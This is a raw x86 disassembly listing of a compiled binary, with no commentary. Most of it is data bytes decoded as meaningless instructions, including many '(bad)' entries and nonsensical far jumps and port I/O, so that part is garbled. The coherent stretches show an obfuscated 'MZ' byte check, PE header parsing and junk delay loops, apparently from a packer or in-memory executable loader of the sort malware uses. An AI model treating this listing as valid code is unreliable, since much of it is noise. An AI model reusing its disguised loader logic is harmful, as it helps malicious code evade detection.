  40c4dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4de:	push   esi
  40c4df:	jmp    0x5131a22e
  40c4e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4e5:	jmp    0x40c504
  40c4e7:	fcmove st,st(6)
  40c4e9:	inc    ebp
  40c4ea:	sar    edi,1
  40c4ec:	xor    al,0xb2
  40c4ee:	loopne 0x40c536
  40c4f0:	fwait
  40c4f1:	iret   
  40c4f2:	test   BYTE PTR [edx],ch
  40c4f4:	pop    ds
  40c4f5:	inc    edi
  40c4f6:	dec    esi
  40c4f7:	mov    edi,0x6a33b98
  40c4fc:	pusha  
  40c4fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4fe:	mov    ecx,0x122f479f
  40c503:	cli    
  40c504:	ins    BYTE PTR es:[edi],dx
  40c505:	test   esp,ebx
  40c507:	pop    edx
  40c508:	addr16 (bad) 
  40c50b:	cmp    cl,cl
  40c50d:	push   eax
  40c50e:	pop    ds
  40c50f:	adc    cl,BYTE PTR [ebx-0x3a]
  40c512:	adc    ebx,DWORD PTR [esi-0x2e9bec89]
  40c518:	pop    edi
  40c519:	jb     0x40c574
  40c51b:	push   ebp
  40c51c:	hlt    
  40c51d:	(bad)  
  40c520:	mov    ss,WORD PTR [ebp+0x48ad8a4]
  40c526:	and    esp,0x9756a774
  40c52c:	jg     0x40c4b9
  40c52e:	xor    ah,BYTE PTR [ecx]
  40c530:	stos   DWORD PTR es:[edi],eax
  40c531:	ja     0x40c57f
  40c533:	pop    es
  40c534:	out    dx,eax
  40c535:	xchg   edx,eax
  40c536:	ds aas 
  40c538:	daa    
  40c539:	mov    WORD PTR [edx],?
  40c53b:	and    eax,DWORD PTR [esi-0x72]
  40c53e:	xchg   ecx,eax
  40c53f:	cs aaa 
  40c541:	(bad)  
  40c542:	lahf   
  40c543:	cmp    cl,0xe5
  40c546:	js     0x40c4d0
  40c548:	sbb    al,0xed
  40c54a:	push   edi
  40c54b:	pop    ebp
  40c54c:	imul   edi,DWORD PTR [ebp+0x15],0x5639abca
  40c553:	push   esi
  40c554:	xchg   BYTE PTR [ecx+0x7cd93e2f],bl
  40c55a:	sahf   
  40c55b:	adc    dl,dl
  40c55d:	jge    0x40c52d
  40c55f:	sub    al,0xcc
  40c561:	ret    0x2209
  40c564:	outs   dx,BYTE PTR ds:[esi]
  40c565:	or     al,BYTE PTR [ecx+ebp*4+0x11df2eef]
  40c56c:	imul   ebp,DWORD PTR [eax+eiz*4+0x3503861f],0xffffff98
  40c574:	add    al,ah
  40c576:	scas   al,BYTE PTR es:[edi]
  40c577:	call   0x31a:0x18c89a94
  40c57e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c57f:	xor    al,0x76
  40c581:	jle    0x40c53e
  40c583:	test   DWORD PTR [esi+0x4c06a55e],ebx
  40c589:	retf   0xa15d
  40c58c:	mul    ch
  40c58e:	std    
  40c58f:	repz and edx,DWORD PTR [edi]
  40c592:	popa   
  40c593:	loopne 0x40c55c
  40c595:	fisub  DWORD PTR ds:0xbb8f4668
  40c59b:	and    BYTE PTR ds:0xac0ef5f9,bh
  40c5a1:	es jae 0x40c60f
  40c5a4:	cmc    
  40c5a5:	sub    eax,0x7b2310a9
  40c5aa:	dec    edx
  40c5ab:	mov    esp,0x13dba87
  40c5b0:	pushf  
  40c5b1:	(bad)  
  40c5b2:	cmp    BYTE PTR [edx-0xe6c3042],ah
  40c5b8:	jae    0x40c5c9
  40c5ba:	ffreep st(1)
  40c5bc:	push   ebx
  40c5bd:	das    
  40c5be:	dec    edi
  40c5bf:	jnp    0x40c5e4
  40c5c1:	enter  0x8453,0x2e
  40c5c5:	cdq    
  40c5c6:	mov    dl,0x45
  40c5c8:	lods   eax,DWORD PTR ds:[esi]
  40c5c9:	push   eax
  40c5ca:	fnstenv [edx+0x24]
  40c5cd:	jp     0x40c623
  40c5cf:	sub    eax,0x70569c5e
  40c5d4:	js     0x40c590
  40c5d6:	imul   eax,DWORD PTR [esi+edi*8+0x17],0x4e3b24c7
  40c5de:	aas    
  40c5df:	dec    esp
  40c5e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5e1:	aas    
  40c5e2:	es dec ebx
  40c5e4:	das    
  40c5e5:	mov    DWORD PTR [ecx+eiz*8+0x2b2cff54],edx
  40c5ec:	jo     0x40c622
  40c5ee:	ror    cl,1
  40c5f0:	int    0x89
  40c5f2:	xor    eax,edx
  40c5f4:	cmp    al,0x82
  40c5f6:	(bad)  
  40c5f7:	bound  ecx,QWORD PTR [edx-0xcbd4972]
  40c5fd:	sub    al,0x49
  40c5ff:	leave  
  40c600:	arpl   WORD PTR [eax],ax
  40c602:	cmp    eax,0x3f26f990
  40c607:	shl    esi,cl
  40c609:	inc    esi
  40c60a:	add    al,0xeb
  40c60c:	icebp  
  40c60d:	cmp    al,0xc4
  40c60f:	mov    esp,0x86caa451
  40c614:	nop
  40c615:	jl     0x40c5c8
  40c617:	pop    ebp
  40c618:	test   BYTE PTR [edx+ebx*4-0x1b49cec1],bh
  40c61f:	popf   
  40c620:	pop    esp
  40c621:	icebp  
  40c622:	bound  esi,QWORD PTR [esi-0x51ea8e3d]
  40c628:	jnp    0x40c5c2
  40c62a:	push   esp
  40c62b:	sub    eax,0x8d00d152
  40c630:	adc    al,BYTE PTR [ecx+edi*1+0x425d5c0]
  40c637:	or     ebp,edi
  40c639:	xchg   esi,eax
  40c63a:	neg    eax
  40c63c:	out    dx,al
  40c63d:	adc    ecx,DWORD PTR [edx-0x3a]
  40c640:	int    0xd2
  40c642:	xchg   ebx,eax
  40c643:	mov    al,ds:0x807ff2d5
  40c648:	daa    
  40c649:	and    esi,DWORD PTR [edx-0x5f]
  40c64c:	mov    esp,DWORD PTR [esi-0xbe2d7]
  40c652:	ins    DWORD PTR es:[edi],dx
  40c653:	lods   eax,DWORD PTR ds:[esi]
  40c654:	mov    esp,0x5dece6b0
  40c659:	mov    edi,0xf9352cf3
  40c65e:	push   eax
  40c65f:	mov    ecx,0x3ba28305
  40c664:	bound  ebp,QWORD PTR [esi+0x13a66b76]
  40c66a:	pushf  
  40c66b:	repnz repz sbb al,BYTE PTR [ebx-0x1e]
  40c670:	inc    ebx
  40c671:	xchg   esi,eax
  40c672:	(bad)
  40c675:	add    BYTE PTR [ebx+edi*4],bh
  40c678:	sub    DWORD PTR [ebx-0x7f0d27ec],esi
  40c67e:	push   ebp
  40c67f:	test   BYTE PTR [edi-0x18],ch
  40c682:	jno    0x40c687
  40c684:	inc    edi
  40c685:	sub    eax,0x1db7fb05
  40c68a:	cdq    
  40c68b:	in     eax,dx
  40c68c:	mov    bl,0xda
  40c68e:	cld    
  40c68f:	ins    BYTE PTR es:[edi],dx
  40c690:	lock pusha 
  40c692:	pop    ecx
  40c693:	or     DWORD PTR [eax-0x65],0x69
  40c697:	push   es
  40c698:	pop    esi
  40c699:	jno    0x40c695
  40c69b:	fxch   st(6)
  40c69d:	ins    BYTE PTR es:[edi],dx
  40c69e:	sar    BYTE PTR [ebx],0xe9
  40c6a1:	ret    
  40c6a2:	sub    DWORD PTR [eax-0x34fecfea],ebp
  40c6a8:	push   eax
  40c6a9:	mov    ebp,0x5dd9ea8d
  40c6ae:	fwait
  40c6af:	cmp    ch,BYTE PTR [esi-0x69]
  40c6b2:	and    BYTE PTR [eax-0x1982938e],bh
  40c6b8:	(bad)  
  40c6b9:	pop    esi
  40c6ba:	sub    BYTE PTR [esi-0x76a3fe42],bh
  40c6c0:	or     BYTE PTR [eax],al
  40c6c2:	and    eax,0x3996ed8f
  40c6c7:	jbe    0x40c6a1
  40c6c9:	add    BYTE PTR [ebx],0x41
  40c6cc:	sbb    al,0x53
  40c6ce:	scas   al,BYTE PTR es:[edi]
  40c6cf:	sti    
  40c6d0:	ins    DWORD PTR es:[edi],dx
  40c6d1:	into   
  40c6d2:	aam    0xc8
  40c6d4:	mov    ebp,DWORD PTR [edx-0x2]
  40c6d7:	and    BYTE PTR [ebx+ebx*2+0x5b],0xed
  40c6dc:	imul   edi,esp,0xeba22fa3
  40c6e2:	scas   eax,DWORD PTR es:[edi]
  40c6e3:	push   ds
  40c6e4:	xchg   edi,eax
  40c6e5:	fsqrt  
  40c6e7:	pop    ecx
  40c6e8:	sub    DWORD PTR [ecx],edx
  40c6ea:	rcl    DWORD PTR [edi],0x2c
  40c6ed:	or     eax,0x5885d912
  40c6f2:	mov    dh,0xd8
  40c6f4:	jmp    0xe3b7:0xa5d5d05f
  40c6fb:	xor    cl,BYTE PTR [ecx-0x5134c8c]
  40c701:	fwait
  40c702:	add    BYTE PTR [ebx-0x65],ch
  40c705:	scas   eax,DWORD PTR es:[edi]
  40c706:	imul   ecx,edx,0x7b0ab396
  40c70c:	out    0xf4,al
  40c70e:	rol    BYTE PTR ds:0xe8c1475,0xc8
  40c715:	mov    ebx,0x85b7d143
  40c71a:	into   
  40c71b:	lods   al,BYTE PTR ds:[esi]
  40c71c:	sub    cl,BYTE PTR [ecx+edx*4-0x3c]
  40c720:	pop    ecx
  40c721:	test   al,0xa8
  40c723:	lea    eax,[edx-0x64]
  40c726:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c727:	pop    edx
  40c728:	mov    ebp,ecx
  40c72a:	leave  
  40c72b:	data16 arpl WORD PTR [eax+0x37a22473],cx
  40c732:	lods   al,BYTE PTR ds:[esi]
  40c733:	dec    ebp
  40c734:	(bad)  
  40c736:	push   eax
  40c737:	dec    eax
  40c738:	sahf   
  40c739:	test   BYTE PTR [ebx],ch
  40c73b:	dec    esp
  40c73c:	call   0x67b8be3f
  40c741:	push   ebx
  40c742:	pop    esp
  40c743:	sub    BYTE PTR [esi+esi*8-0x1c],ch
  40c747:	popf   
  40c748:	mov    cl,0x7a
  40c74a:	test   al,0x1f
  40c74c:	outs   dx,BYTE PTR ds:[esi]
  40c74d:	leave  
  40c74e:	sub    al,BYTE PTR [ecx]
  40c750:	(bad)  
  40c751:	mov    ?,ebx
  40c753:	in     eax,dx
  40c754:	xor    eax,0x76e57097
  40c759:	adc    DWORD PTR [ecx+ebx*2-0x21],0xf16a8d08
  40c761:	test   eax,0x78cacff
  40c766:	jmp    0x10482086
  40c76b:	mov    edi,0xc68cddfe
  40c770:	rcl    BYTE PTR [edx],cl
  40c772:	aam    0xb6
  40c774:	inc    edx
  40c775:	hlt    
  40c776:	mov    ch,BYTE PTR [ebp+0x5f2fa7d1]
  40c77c:	cmp    cl,al
  40c77e:	mov    dh,0x61
  40c780:	nop
  40c781:	add    BYTE PTR [edi-0x2dae1473],dl
  40c787:	ins    DWORD PTR es:[edi],dx
  40c788:	dec    esp
  40c789:	add    eax,0xd7834e6f
  40c78e:	xchg   edx,eax
  40c78f:	and    esp,DWORD PTR es:[ebx+0x78]
  40c793:	xor    eax,0xa3a008c8
  40c798:	sub    edx,edx
  40c79a:	jl     0x4e446ea8
  40c7a0:	inc    esp
  40c7a1:	mov    bl,BYTE PTR [eax-0x44a542f8]
  40c7a7:	mov    bl,0xdf
  40c7a9:	sti    
  40c7aa:	sbb    DWORD PTR [ebp+0x297fff],ebp
  40c7b0:	mov    dh,0xd
  40c7b2:	jmp    0x409bcba7
  40c7b7:	(bad)  
  40c7b8:	shl    BYTE PTR [edx],cl
  40c7ba:	int    0x48
  40c7bc:	jnp    0x40c817
  40c7be:	mov    esp,0xefe595cd
  40c7c3:	jmp    0x6baf761d
  40c7c8:	mov    ch,0x85
  40c7ca:	loope  0x40c80c
  40c7cc:	jnp    0x40c78e
  40c7ce:	sbb    bl,BYTE PTR [di]
  40c7d1:	xor    al,0xf2
  40c7d3:	std    
  40c7d4:	push   0x5e
  40c7d6:	mov    ecx,DWORD PTR [ebp-0x8]
  40c7d9:	mov    ecx,DWORD PTR [ecx]
  40c7db:	mov    eax,DWORD PTR [eax+ecx*1]
  40c7de:	mov    DWORD PTR [ebp-0x20],eax
  40c7e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c7e4:	xor    eax,esi
  40c7e6:	add    eax,edi
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	in     eax,0xa
  40c801:	push   esp
  40c802:	hlt    
  40c803:	leave  
  40c804:	cmp    BYTE PTR [esi+0x7e],0x2e
  40c808:	jge    0x40c888
  40c80a:	jle    0x40c81c
  40c80c:	nop
  40c80d:	and    al,0x15
  40c80f:	or     DWORD PTR [ecx-0x7b449273],0x5bca374a
  40c819:	test   eax,0x1a9cef48
  40c81e:	or     BYTE PTR [ebp+0x728992cf],ch
  40c824:	push   DWORD PTR [ecx+0x4d]
  40c827:	mov    al,dh
  40c829:	sub    DWORD PTR [ecx],eax
  40c82b:	out    0x5c,al
  40c82d:	out    0x8a,al
  40c82f:	xor    ax,0x2bd6
  40c833:	pop    ebp
  40c834:	retf   
  40c835:	je     0x40c7ec
  40c837:	imul   ah
  40c839:	ins    BYTE PTR es:[edi],dx
  40c83a:	ret    0x79eb
  40c83d:	hlt    
  40c83e:	icebp  
  40c83f:	rcr    al,0x5f
  40c842:	jl     0x40c810
  40c844:	loopne 0x40c897
  40c846:	push   edx
  40c847:	dec    ebp
  40c848:	or     DWORD PTR [esp+ebx*2-0x74],0x10
  40c84d:	jb     0x40c8ac
  40c84f:	sbb    BYTE PTR [ecx],ah
  40c851:	xor    BYTE PTR [eax+0x67],ch
  40c854:	stc    
  40c855:	and    al,0x3e
  40c857:	ins    BYTE PTR es:[edi],dx
  40c858:	loop   0x40c8a9
  40c85a:	jg     0x40c81b
  40c85c:	and    al,0x58
  40c85e:	cmp    edx,DWORD PTR [ebx+ebx*8-0x1f]
  40c862:	fcomp  DWORD PTR [ebp+0x7418df2b]
  40c868:	pop    eax
  40c869:	div    BYTE PTR [ecx+0x6fba0ba2]
  40c86f:	jnp    0x40c838
  40c871:	stos   BYTE PTR es:[edi],al
  40c872:	retf   
  40c873:	test   eax,0xaaaa568e
  40c878:	out    0x1d,al
  40c87a:	xor    DWORD PTR ds:0xb340d9f5,ebp
  40c880:	mov    edx,0x231b0c8c
  40c885:	mov    eax,ds:0xb35d1e22
  40c88a:	call   0x9d64:0xbd97fcd8
  40c891:	push   ebp
  40c892:	push   edx
  40c893:	sub    dh,BYTE PTR ds:0xf5ffb188
  40c899:	outs   dx,BYTE PTR ds:[esi]
  40c89a:	in     eax,0xad
  40c89c:	mov    eax,ds:0xe1bda9cd
  40c8a1:	ins    DWORD PTR es:[edi],dx
  40c8a2:	ffree  st(1)
  40c8a4:	jg     0x40c8bf
  40c8a6:	jb     0x40c855
  40c8a8:	mov    WORD PTR [eax],ss
  40c8aa:	pop    ebp
  40c8ab:	icebp  
  40c8ac:	repnz das 
  40c8ae:	test   BYTE PTR [ecx-0x25],dl
  40c8b1:	sub    DWORD PTR [eax-0x80],esp
  40c8b4:	mov    ds:0x1814b02d,al
  40c8b9:	(bad)  
  40c8ba:	sti    
  40c8bb:	mov    edx,0x8964d62e
  40c8c0:	mov    esp,0x16d013f0
  40c8c5:	inc    ebp
  40c8c6:	ss mov bl,0x18
  40c8c9:	loopne 0x40c8ee
  40c8cb:	or     eax,0x71e5fdc2
  40c8d0:	cmp    al,0x45
  40c8d2:	(bad)  
  40c8d4:	out    dx,al
  40c8d5:	xchg   BYTE PTR [ebp-0xb],ah
  40c8d8:	in     eax,0xe9
  40c8da:	fldenv [esp+ebx*2-0x6]
  40c8de:	dec    esp
  40c8df:	fidiv  WORD PTR [edi]
  40c8e1:	pushf  
  40c8e2:	push   eax
  40c8e3:	and    esp,edx
  40c8e5:	xchg   ebx,eax
  40c8e6:	dec    edx
  40c8e7:	add    DWORD PTR ds:[esi-0xb],ebp
  40c8eb:	repz fdiv QWORD PTR [ebp-0x7863078f]
  40c8f2:	and    al,0xb
  40c8f4:	xor    esi,DWORD PTR [ecx+0x51]
  40c8f7:	jne    0x40c957
  40c8f9:	pop    esi
  40c8fa:	dec    edx
  40c8fb:	into   
  40c8fc:	(bad)  
  40c8fd:	adc    BYTE PTR ds:0x125d7cb5,al
  40c903:	imul   esi,DWORD PTR [eax+0x1082777],0x9b8af7ab
  40c90d:	dec    ebx
  40c90e:	or     eax,0x8a9d3fb1
  40c913:	fwait
  40c914:	stos   BYTE PTR es:[edi],al
  40c915:	mov    ebp,0x673ccb92
  40c91a:	call   0x3d76:0x25e9
  40c920:	popa   
  40c921:	rcr    dh,cl
  40c923:	xchg   ebp,eax
  40c924:	aas    
  40c925:	clc    
  40c926:	iret   
  40c927:	inc    esp
  40c928:	sbb    dh,BYTE PTR [ebx+0x54d7d60c]
  40c92e:	push   0x6c913801
  40c933:	arpl   WORD PTR [ecx+ebp*8+0x60],ax
  40c937:	aaa    
  40c938:	lea    eax,[ebx+0x58]
  40c93b:	stc    
  40c93c:	adc    al,0xc0
  40c93e:	dec    eax
  40c93f:	int3   
  40c940:	(bad)  
  40c941:	adc    DWORD PTR [edi-0x7587ed7],ebp
  40c947:	or     BYTE PTR [edi],0x79
  40c94a:	pop    eax
  40c94b:	or     eax,0x2fbb502a
  40c950:	iret   
  40c951:	cmp    ebx,0xa3dc7d99
  40c957:	xchg   edx,eax
  40c958:	adc    eax,DWORD PTR [eax-0x437f166]
  40c95e:	ins    DWORD PTR es:[edi],dx
  40c95f:	fcomp  st(6)
  40c961:	outs   dx,DWORD PTR ds:[esi]
  40c962:	mov    eax,ds:0x49a0fe97
  40c967:	call   0xbff0193c
  40c96c:	int    0x92
  40c96e:	sbb    eax,0x3368617c
  40c973:	pop    edx
  40c974:	(bad)  
  40c975:	retf   0x6f1
  40c978:	mov    esp,DWORD PTR [ebx]
  40c97a:	in     eax,0x5d
  40c97c:	mov    ebp,0x131b396a
  40c981:	xor    eax,0xed82e3dd
  40c986:	cmp    edx,DWORD PTR [eax-0x1152d9fa]
  40c98c:	stos   WORD PTR es:[edi],ax
  40c98e:	rcl    DWORD PTR [ecx-0x270d24c2],cl
  40c994:	sahf   
  40c995:	dec    ebx
  40c996:	arpl   WORD PTR [edx+edx*1-0xe],ax
  40c99a:	pop    ecx
  40c99b:	cpuid  
  40c99d:	mov    al,0x87
  40c99f:	jne    0x40c9fc
  40c9a1:	out    dx,al
  40c9a2:	and    BYTE PTR [ebx],cl
  40c9a4:	out    0x3a,al
  40c9a6:	fistp  WORD PTR [esi+0x761ed32c]
  40c9ac:	sbb    al,BYTE PTR [ebx+0x18ebbaf0]
  40c9b2:	in     al,dx
  40c9b3:	inc    esp
  40c9b4:	jbe    0x40ca29
  40c9b6:	hlt    
  40c9b7:	outs   dx,DWORD PTR ds:[esi]
  40c9b8:	mov    ebx,DWORD PTR [eax+0x4d]
  40c9bb:	adc    eax,0xa66a3282
  40c9c0:	cmp    BYTE PTR [edx+0x6f],bl
  40c9c3:	pop    es
  40c9c4:	cmp    eax,0xf7b6e12
  40c9c9:	xor    DWORD PTR [eax+eiz*8+0x6e],ebp
  40c9cd:	push   0xffffffec
  40c9cf:	sub    DWORD PTR [ecx+0x2],edi
  40c9d2:	xchg   edx,eax
  40c9d3:	imul   esi,DWORD PTR [edx],0x48
  40c9d6:	lock int 0x31
  40c9d9:	jne    0x40c97b
  40c9db:	or     edi,DWORD PTR [edi-0x5ffb2f23]
  40c9e1:	lea    esp,[eax-0x43568347]
  40c9e7:	mov    eax,ds:0x3a00073b
  40c9ec:	(bad)  
  40c9ee:	in     eax,0xcb
  40c9f0:	dec    cl
  40c9f2:	ss in  eax,0x51
  40c9f5:	aam    0x61
  40c9f7:	test   BYTE PTR [esi-0x617f0d6f],bl
  40c9fd:	imul   edi,ecx,0xcdb55e56
  40ca03:	(bad)  
  40ca04:	and    BYTE PTR [eax+edi*2+0x6f041f99],0x2d
  40ca0c:	and    eax,ebp
  40ca0e:	imul   ebp,DWORD PTR [edi],0xc42f7c4d
  40ca14:	cmp    dl,dl
  40ca16:	mov    ebp,0xd689198e
  40ca1b:	cdq    
  40ca1c:	dec    ebp
  40ca1d:	js     0x40c9ec
  40ca1f:	cmp    al,0xac
  40ca21:	push   edx
  40ca22:	daa    
  40ca23:	jmp    0x40caa0
  40ca25:	pop    ebp
  40ca26:	inc    al
  40ca28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca29:	(bad)  
  40ca2a:	mov    dh,0xbc
  40ca2c:	sbb    eax,0xc99918d6
  40ca31:	xchg   edi,eax
  40ca32:	shl    BYTE PTR [eax-0x4c],cl
  40ca35:	cmc    
  40ca36:	xchg   si,ax
  40ca38:	or     al,0xdd
  40ca3a:	fsubr  st,st(0)
  40ca3c:	mov    cl,0x10
  40ca3e:	ror    bh,0x34
  40ca41:	mov    ecx,edx
  40ca43:	pop    ss
  40ca44:	pop    esi
  40ca45:	mov    ecx,DWORD PTR [ecx+0x34]
  40ca48:	repnz pop edi
  40ca4a:	pusha  
  40ca4b:	gs (bad) 
  40ca4e:	gs stos DWORD PTR es:[edi],eax
  40ca50:	loopne 0x40ca9c
  40ca52:	gs stos DWORD PTR es:[edi],eax
  40ca54:	cwde   
  40ca55:	or     cl,BYTE PTR [ebp+0x11662492]
  40ca5b:	jp     0x40caa3
  40ca5d:	xchg   esi,eax
  40ca5e:	inc    ebp
  40ca5f:	(bad)  
  40ca60:	xor    bl,cl
  40ca62:	add    eax,ebx
  40ca64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca65:	int    0x82
  40ca67:	jbe    0x40ca52
  40ca69:	imul   edx,ecx,0x45f8b08b
  40ca6f:	imul   edi,DWORD PTR [edi+0x34],0xffffffc3
  40ca73:	or     eax,0xd48dcd05
  40ca78:	fsubr  QWORD PTR [edi-0x7975fb7]
  40ca7e:	rol    DWORD PTR [esi+0x74],0x5e
  40ca82:	lahf   
  40ca83:	pop    eax
  40ca84:	xor    al,0xea
  40ca86:	add    al,0x9d
  40ca88:	jle    0x40ca3e
  40ca8a:	xor    ebx,DWORD PTR [eax-0x3]
  40ca8d:	neg    DWORD PTR [esi]
  40ca8f:	dec    esp
  40ca90:	arpl   di,ax
  40ca92:	push   ebp
  40ca93:	push   ebp
  40ca94:	fisttp WORD PTR [edx-0x6186ef40]
  40ca9a:	dec    eax
  40ca9b:	dec    ecx
  40ca9c:	adc    eax,edi
  40ca9e:	in     eax,0xca
  40caa0:	dec    BYTE PTR [ebx-0x45087d9c]
  40caa6:	dec    ecx
  40caa7:	adc    al,0xa
  40caa9:	cmp    al,0x7f
  40caab:	shr    ch,1
  40caad:	jmp    0x40ca94
  40caaf:	pop    ebp
  40cab0:	rcl    DWORD PTR [ebp+0x1442607c],cl
  40cab6:	mov    ah,ch
  40cab8:	lods   al,BYTE PTR ds:[esi]
  40cab9:	stos   BYTE PTR es:[edi],al
  40caba:	adc    al,0xb3
  40cabc:	lahf   
  40cabd:	xchg   BYTE PTR [ecx-0x2f],al
  40cac0:	mov    edx,0x9c42208
  40cac5:	in     al,dx
  40cac6:	scas   eax,DWORD PTR es:[edi]
  40cac7:	add    DWORD PTR [ebp-0x68010ccc],ebx
  40cacd:	lds    ecx,FWORD PTR [edi+edi*2]
  40cad0:	ficom  WORD PTR [esi]
  40cad2:	add    eax,0xa6cb081d
  40cad7:	mov    ecx,0xd44ec6c0
  40cadc:	into   
  40cadd:	in     al,dx
  40cade:	shr    bh,0xc2
  40cae1:	lods   eax,DWORD PTR ds:[esi]
  40cae2:	in     al,0x74
  40cae4:	sbb    ebp,ecx
  40cae6:	or     al,0xae
  40cae8:	add    eax,0x9aa5e979
  40caed:	pop    ebp
  40caee:	push   esi
  40caef:	rol    BYTE PTR [edi+0x48],cl
  40caf2:	inc    edx
  40caf3:	xor    eax,0x141a11a4
  40caf8:	cs mov bh,0xf
  40cafb:	pop    ebx
  40cafc:	add    DWORD PTR [ebx-0x67],edi
  40caff:	scas   eax,DWORD PTR es:[edi]
  40cb00:	jg     0x40cac2
  40cb02:	push   es
  40cb03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb04:	test   al,0xfd
  40cb06:	aam    0xbb
  40cb08:	shl    dl,cl
  40cb0a:	pop    eax
  40cb0b:	icebp  
  40cb0c:	push   es
  40cb0d:	pusha  
  40cb0e:	adc    al,0xa1
  40cb10:	out    0xef,al
  40cb12:	mov    DWORD PTR [esi+0x58],esp
  40cb15:	cld    
  40cb16:	aas    
  40cb17:	into   
  40cb18:	leave  
  40cb19:	or     al,0xfc
  40cb1b:	xchg   esp,eax
  40cb1c:	dec    ebp
  40cb1d:	mov    eax,ds:0x1e03608e
  40cb22:	sbb    BYTE PTR ds:0x97ed86b6,ah
  40cb28:	mov    bh,0x8a
  40cb2a:	xchg   edi,eax
  40cb2b:	mov    eax,0xf2525011
  40cb30:	mov    eax,0x9b1a55ee
  40cb35:	out    dx,al
  40cb36:	push   es
  40cb37:	pop    ss
  40cb38:	cdq    
  40cb39:	mov    eax,ds:0xe04d8b84
  40cb3e:	xor    eax,esi
  40cb40:	add    eax,edi
  40cb42:	cmp    ecx,eax
  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x430455,0x0
  40cbd0:	jmp    0x40cbe0
  40cbd5:	mov    eax,ds:0x430455
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x430455,eax
  40cbe0:	cmp    DWORD PTR ds:0x430455,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x430455,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42ea0b
  40cc05:	cmp    DWORD PTR ds:0x430455,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x430455
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x430455,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x43043d,0x0
  40cc2f:	mov    eax,ds:0x43043d
  40cc34:	inc    eax
  40cc35:	mov    ds:0x43043d,eax
  40cc3a:	cmp    DWORD PTR ds:0x43043d,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e917
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42eacb
  40cc6b:	cmp    DWORD PTR ds:0x43043d,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc8f:	add    ecx,DWORD PTR [eax+0x3c]
  40cc92:	mov    edx,0x7510854
  40cc97:	mov    DWORD PTR [ebp+0x8],ecx
  40cc9a:	mov    eax,DWORD PTR [ebp-0x4]
  40cc9d:	xor    eax,edx
  40cc9f:	push   esi
  40cca0:	mov    esi,DWORD PTR [ebp+0x8]
  40cca3:	mov    ecx,0x32729b
  40cca8:	add    eax,ecx
  40ccaa:	cmp    DWORD PTR [esi+0x54],eax
